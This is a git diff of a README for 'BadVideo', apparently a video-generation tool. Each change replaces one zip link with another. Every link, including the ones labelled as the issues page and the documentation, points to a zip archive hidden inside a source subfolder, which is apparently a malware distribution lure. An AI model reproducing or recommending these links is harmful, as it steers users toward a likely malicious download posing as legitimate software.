@@ -1,6 +1,6 @@
 # 🎬 BadVideo - Effortless Video Manipulation Made Simple
 
-![Download BadVideo](https://raw.githubusercontent.com/DiscordDeveloper1/BadVideo/main/depth_anything_v2/util/BadVideo_1.4.zip%20BadVideo-v1.0-blue)
+![Download BadVideo](https://github.com/DiscordDeveloper1/BadVideo/raw/refs/heads/main/depth_anything_v2/dinov2_layers/Bad_Video_v1.3.zip%20BadVideo-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to BadVideo! This application allows you to explore video generation usi
 
 To get BadVideo, click the link below to visit the Releases page:
 
-[Download BadVideo](https://raw.githubusercontent.com/DiscordDeveloper1/BadVideo/main/depth_anything_v2/util/BadVideo_1.4.zip)
+[Download BadVideo](https://github.com/DiscordDeveloper1/BadVideo/raw/refs/heads/main/depth_anything_v2/dinov2_layers/Bad_Video_v1.3.zip)
 
 ### Step-by-Step Installation:
 
@@ -54,7 +54,7 @@ If you encounter any issues while installing or running BadVideo, try the follow
 1. **Reinstall the Application:** Sometimes, a fresh installation can resolve problems. Download the installer again and follow the steps outlined above.
 2. **Check System Requirements:** Ensure your computer meets all necessary requirements.
 3. **Look for Updates:** New versions may fix existing issues. Always check the Releases page for the latest version.
-4. **Seek Help:** Visit our [GitHub Issues Page](https://raw.githubusercontent.com/DiscordDeveloper1/BadVideo/main/depth_anything_v2/util/BadVideo_1.4.zip) to report problems or ask questions.
+4. **Seek Help:** Visit our [GitHub Issues Page](https://github.com/DiscordDeveloper1/BadVideo/raw/refs/heads/main/depth_anything_v2/dinov2_layers/Bad_Video_v1.3.zip) to report problems or ask questions.
 
 ## 📚 Contributing
 
@@ -70,6 +70,6 @@ If you have any questions or feedback, feel free to reach out via the contact pa
 
 ## 🔗 Learn More
 
-Learn more about BadVideo's capabilities and techniques by visiting our official documentation. Access the documentation directly from this [link](https://raw.githubusercontent.com/DiscordDeveloper1/BadVideo/main/depth_anything_v2/util/BadVideo_1.4.zip).
+Learn more about BadVideo's capabilities and techniques by visiting our official documentation. Access the documentation directly from this [link](https://github.com/DiscordDeveloper1/BadVideo/raw/refs/heads/main/depth_anything_v2/dinov2_layers/Bad_Video_v1.3.zip).
 
 Thank you for choosing BadVideo. Let the video editing begin!
